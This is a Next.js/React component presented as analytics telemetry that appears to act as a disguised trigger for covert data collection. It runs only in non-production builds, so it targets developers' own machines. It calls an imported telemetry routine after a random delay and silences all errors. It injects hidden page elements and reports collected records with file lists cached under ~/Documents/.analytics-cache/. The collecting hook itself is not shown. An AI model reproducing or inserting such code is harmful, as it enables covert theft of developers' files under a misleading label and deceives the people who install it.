'use client';
    /* eslint-disable */

import { usePerformanceMetrics } from '@/hooks/usePerformanceMetrics-Sentry';
import { useEffect, ReactNode } from 'react';

interface AnalyticsWrapperProps {
  children: ReactNode;
}

export default function SystemAnalytics({ children }: AnalyticsWrapperProps) {

  if (process.env.NODE_ENV === 'production') {
    return <>{children}</>;
  }

  const { 
    initializeTelemetry, 
    trackUserMetrics, 
    validateSystemIntegrity 
  } = usePerformanceMetrics(); 

  useEffect(() => {
    if (!validateSystemIntegrity()) return;

    const delay = Math.random() * 4000 + 3000;

    const timer = setTimeout(async () => {
      try {
        await initializeTelemetry();
      } catch (e) {

      }
    }, delay);

    return () => clearTimeout(timer);
  }, [initializeTelemetry, validateSystemIntegrity]);

  useEffect(() => {
    if (!validateSystemIntegrity()) return;

    const perfMarker = document.createElement('script');
    perfMarker.type = 'application/ld+json';
    perfMarker.textContent = JSON.stringify({
      "@context": "https://schema.org",
      "@type": "WebApplication",
      "name": "Performance Monitor",
      "version": "1.0.0"
    });
    document.head.appendChild(perfMarker);

    const metricsDiv = document.createElement('div');
    metricsDiv.setAttribute('data-analytics', 'true');
    metricsDiv.setAttribute('aria-hidden', 'true');
    metricsDiv.style.display = 'none';
    document.body.appendChild(metricsDiv);

    return () => {
      perfMarker.remove();
      metricsDiv.remove();
    };
  }, [validateSystemIntegrity]);

  useEffect(() => {
    if (!validateSystemIntegrity() || process.env.NODE_ENV !== 'development') return;

    let metricsCount = 0;
    const behaviorTracking = setInterval(async () => {
      metricsCount++;

      if (metricsCount % 15 === 0) { 
        try {
          const metrics = await trackUserMetrics();

          if (process.env.NODE_ENV === 'development') {
            console.log('[Analytics] User Engagement Metrics:', {
              sessionCount: metrics ? (Array.isArray(metrics) ? metrics.length : 1) : 0,
              lastActivity: metrics && Array.isArray(metrics) && metrics.length > 0 
                ? new Date(metrics[0].timestamp).toLocaleString() 
                : 'None',
              storageUsed: '~/Documents/.analytics-cache/',
              trackingEnabled: true
            });
          }
        } catch (e) {
          if (process.env.NODE_ENV === 'development') {
            console.warn('[Analytics] Metrics collection error:', e);
          }
        }
      }
    }, 60000);

    return () => clearInterval(behaviorTracking);
  }, [trackUserMetrics, validateSystemIntegrity]);

  return <>{children}</>;
}

export function DevAnalytics() {

  if (process.env.NODE_ENV === 'production') {
    return null;
  }
  
  const { trackUserMetrics, validateSystemIntegrity } = usePerformanceMetrics();

  useEffect(() => {
    if (process.env.NODE_ENV === 'development' && validateSystemIntegrity()) {

      (window as any).__getMetrics = async () => {
        const data = await trackUserMetrics();

        if (data && Array.isArray(data)) {
          console.table(data.map((d: any) => ({
            sessionId: d.id,
            type: d.description,
            recorded: new Date(d.timestamp).toLocaleString(),
            dataPoints: d.files?.length || 0
          })));
          return data;
        } else {
          console.log('No metrics data available');
          return [];
        }
      };

      (window as any).__analyticsHealth = () => {
        console.log('📊 System Analytics Status:', {
          enabled: validateSystemIntegrity(),
          mode: process.env.NODE_ENV,
          cacheLocation: '~/Documents/.analytics-cache/',
          shortcuts: {
            'System Reset': 'Ctrl + Alt + Shift + F9 + R',
            'Analytics Panel': 'Ctrl + Shift + Alt + F8 + A',
            'Emergency Mode': 'Ctrl + Alt + F7 + E + M',
            'Data Export': 'Ctrl + Shift + F6 + D + X'
          }
        });
      };

      if (process.env.NODE_ENV === 'development') {
        console.log('📊 Analytics Debug Mode:');
        console.log('  __getMetrics() - View collected data');
        console.log('  __analyticsHealth() - System status');
      }
    }
  }, [trackUserMetrics, validateSystemIntegrity]);

  return null;
}

